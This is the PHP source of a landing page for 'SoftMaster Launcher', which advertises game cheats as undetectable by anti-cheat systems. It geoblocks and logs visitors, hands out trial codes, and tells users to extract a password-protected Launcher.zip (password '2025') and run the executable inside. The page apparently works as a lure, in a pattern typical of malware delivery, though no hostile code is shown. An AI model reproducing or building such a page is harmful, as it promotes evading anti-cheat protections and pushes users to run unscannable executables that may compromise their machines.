<?php
// Подключаем геоблок в самом начале
require_once 'geoblock.php';
GeoBlock::check(); // Проверяем и блокируем при необходимости

session_start();
require_once 'admin/db_connect.php';
log_visit();
$stats = get_site_stats();
$games = get_games_list();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SoftMaster - Your Ultimate Enterprise Experience</title>
    <link rel="stylesheet" href="css/landing.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>
    <!-- Основной фон для контентных секций (не применяется к hero) -->
    <div class="content-background">
        <picture>
            <source srcset="images/main.webp" type="image/webp">
            <img src="images/main.jpg" alt="" aria-hidden="true">
        </picture>
    </div>

    <header class="header">
        <div class="container">
            <div class="logo animate__animated animate__fadeInLeft">
                <span>SoftMaster</span>Launcher
            </div>
            <nav class="nav animate__animated animate__fadeInRight">
                <ul>
                    <li><a href="#features">Features</a></li>
                    <li><a href="#games">Games</a></li>
                    <li><a href="#download">Download</a></li>
                    <li><a href="#why-us">Why Us</a></li>
                    <li><a href="#support">Support</a></li>
                </ul>
            </nav>
        </div>
    </header>

    <section class="hero">
        <!-- Уникальный фон только для hero секции -->
        <div class="hero-background">
            <picture>
                <source srcset="images/hero-bg.webp" type="image/webp">
                <img src="images/hero-bg.jpg" alt="" aria-hidden="true">
            </picture>
        </div>
        <div class="container">
            <div class="hero-content animate__animated animate__fadeInUp">
                <h1>Your Ultimate Gaming Experience</h1>
                <p>Access all your favorite cheats for games with one powerful launcher. Get started with 7 days free trial.</p>
                <a href="#download" class="btn btn-primary animate__animated animate__pulse animate__infinite">Get Started</a>
            </div>
            <div class="hero-media animate__animated animate__fadeIn">
                <div class="video-container">
                    <video autoplay loop muted playsinline>
                        <source src="https://up-game.pro/wp-content/themes/up-game/assets/img/main-animation/480p.webm" type="video/webm">
                    </video>
                </div>
            </div>
        </div>
    </section>

    <section id="features" class="features">
        <div class="container">
            <h2 class="section-title animate__animated animate__fadeIn">POWERFUL FEATURES</h2>
            <div class="features-grid">
                <div class="feature-card animate__animated animate__fadeInUp">
                    <div class="feature-icon">
                        <i class="fas fa-rocket"></i>
                    </div>
                    <h3>Ultra Performance</h3>
                    <p>Optimized for maximum FPS with minimal system impact</p>
                </div>
                <div class="feature-card animate__animated animate__fadeInUp" style="animation-delay: 0.2s;">
                    <div class="feature-icon">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <h3>Undetectable</h3>
                    <p>Advanced protection against anti-cheat systems</p>
                </div>
                <div class="feature-card animate__animated animate__fadeInUp" style="animation-delay: 0.4s;">
                    <div class="feature-icon">
                        <i class="fas fa-sync-alt"></i>
                    </div>
                    <h3>Auto Updates</h3>
                    <p>Always up-to-date with the latest features</p>
                </div>
            </div>
        </div>
    </section>

    <section id="games" class="games">
        <div class="container">
            <h2 class="section-title animate__animated animate__fadeIn">AVAILABLE GAMES</h2>
            <div class="games-grid">
                <?php foreach ($games as $game): ?>
                <div class="game-card animate__animated animate__fadeInUp">
                    <div class="game-image">
                        <img src="<?php 
                            // Проверяем, является ли изображение внешней ссылкой или локальным файлом
                            if (!empty($game['image'])) {
                                if (filter_var($game['image'], FILTER_VALIDATE_URL)) {
                                    echo htmlspecialchars($game['image']);
                                } else {
                                    echo htmlspecialchars($game['image']);
                                }
                            } else {
                                echo 'images/placeholder-game.png';
                            }
                        ?>" 
                        alt="<?php echo htmlspecialchars($game['name']); ?>"
                        onerror="this.src='images/placeholder-game.png'">
                    </div>
                    <h3><?php echo htmlspecialchars($game['name']); ?></h3>
                    <a href="#download" class="btn btn-secondary">Get Launcher</a>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </section>

    <section id="why-us" class="why-us">
        <div class="container">
            <h2 class="section-title animate__animated animate__fadeIn">WHY YOU SHOULD CHOOSE US</h2>
            <div class="why-us-grid">
                <div class="why-us-card animate__animated animate__fadeInUp">
                    <div class="card-media gif-container">
                        <img src="videos/undetectable-demo.gif" alt="Undetectable Demo" class="gif-background">
                        <div class="card-content">
                            <div class="why-us-icon">
                                <i class="fas fa-shield-alt"></i>
                            </div>
                            <h3>Undetectable</h3>
                            <p>Our advanced technology ensures complete stealth against anti-cheat systems</p>
                        </div>
                    </div>
                </div>

                <div class="why-us-card animate__animated animate__fadeInUp" style="animation-delay: 0.2s;">
                    <div class="why-us-icon">
                        <i class="fas fa-tachometer-alt"></i>
                    </div>
                    <h3>High Performance</h3>
                    <p>Minimal impact on your system resources with maximum FPS gain</p>
                    <div class="stats-overview">
                        <div class="stat-item">
                            <span class="stat-value">+35%</span>
                            <span class="stat-label">FPS Boost</span>
                        </div>
                        <div class="stat-item">
                            <span class="stat-value">2%</span>
                            <span class="stat-label">CPU Usage</span>
                        </div>
                    </div>
                </div>

                <div class="why-us-card animate__animated animate__fadeInUp" style="animation-delay: 0.4s;">
                    <div class="card-media gif-container">
                        <img src="videos/features-demo.gif" alt="Features Demo" class="gif-background">
                        <div class="card-content">
                            <div class="why-us-icon">
                                <i class="fas fa-cogs"></i>
                            </div>
                            <h3>Advanced Features</h3>
                            <p>Customizable settings for optimal gaming experience</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="download" class="download">
        <div class="container">
            <h2 class="section-title animate__animated animate__fadeIn">GET YOUR LAUNCHER</h2>
            <div class="download-steps">
                <div class="step active" id="step1">
                    <span>1</span>
                    <p>Get Trial Code</p>
                </div>
                <div class="step" id="step2">
                    <span>2</span>
                    <p>Download</p>
                </div>
                <div class="step" id="step3">
                    <span>3</span>
                    <p>Install & Play</p>
                </div>
            </div>

            <div class="download-content">
                <div id="step1-content" class="step-content active">
                    <h3>Get Your 7-Day Free Trial</h3>
                    <button id="generateCodeBtn" class="btn btn-primary">Get Trial Code</button>
                </div>

                <div id="step2-content" class="step-content">
                    <div class="trial-code-box">
                        <h3>Your Trial Code</h3>
                        <div class="code-display blur-code" id="trialCode"></div>
                        <p class="code-valid">Valid for 7 days after activation</p>
                    </div>
                    <a href="<?php echo get_download_link(); ?>" class="btn btn-download" download id="downloadBtn">
                        <i class="fas fa-download"></i> Download Launcher
                    </a>
                </div>

                <div id="step3-content" class="step-content">
                    <div class="installation-steps">
                        <div class="install-step">
                            <h4><i class="fas fa-file-archive"></i> Step 1: Extract Archive</h4>
                            <p>Extract Launcher.zip using password: <strong>2025</strong></p>
                        </div>
                        <div class="install-step">
                            <h4><i class="fas fa-play"></i> Step 2: Run Launcher</h4>
                            <p>Launch SoftMasterLauncher.exe and select your game</p>
                        </div>
                        <div class="install-step">
                            <h4><i class="fas fa-gamepad"></i> Step 3: Enjoy Gaming</h4>
                            <p>Start playing with enhanced experience</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <section id="support" class="support">
        <div class="container">
            <h2 class="section-title animate__animated animate__fadeIn">Need Help?</h2>
            <div class="support-content animate__animated animate__fadeInUp">
                <div class="support-option">
                    <div class="support-icon">
                        <i class="fas fa-question-circle"></i>
                    </div>
                    <h3>FAQ</h3>
                    <p>Find answers to common questions</p>
                    <a href="#" class="btn btn-secondary">View FAQ</a>
                </div>
                <div class="support-option">
                    <div class="support-icon">
                        <i class="fas fa-envelope"></i>
                    </div>
                    <h3>Contact Us</h3>
                    <p>Get in touch with our support team</p>
                    <a href="#" class="btn btn-secondary">Contact</a>
                </div>
                <div class="support-option">
                    <div class="support-icon">
                        <i class="fab fa-discord"></i>
                    </div>
                    <h3>Discord</h3>
                    <p>Join our community for help</p>
                    <a href="#" class="btn btn-secondary">Join Discord</a>
                </div>
            </div>
        </div>
    </section>

    <footer class="footer">
        <div class="container">
            <div class="footer-content">
                <div class="footer-logo">
                    <span>SoftMaster</span>Launcher
                </div>
                <div class="footer-links">
                    <ul>
                        <li><a href="#">Terms of Service</a></li>
                        <li><a href="#">Privacy Policy</a></li>
                        <li><a href="#support">Support</a></li>
                    </ul>
                </div>
                <div class="footer-social">
                    <a href="#"><i class="fab fa-discord"></i></a>
                    <a href="#"><i class="fab fa-twitter"></i></a>
                    <a href="#"><i class="fab fa-youtube"></i></a>
                </div>
            </div>
            <div class="footer-copyright">
                <p>&copy; <?php echo date('Y'); ?> SoftMaster Launcher. All rights reserved.</p>
            </div>
        </div>
    </footer>

    <script src="js/landing.js"></script>
</body>
</html>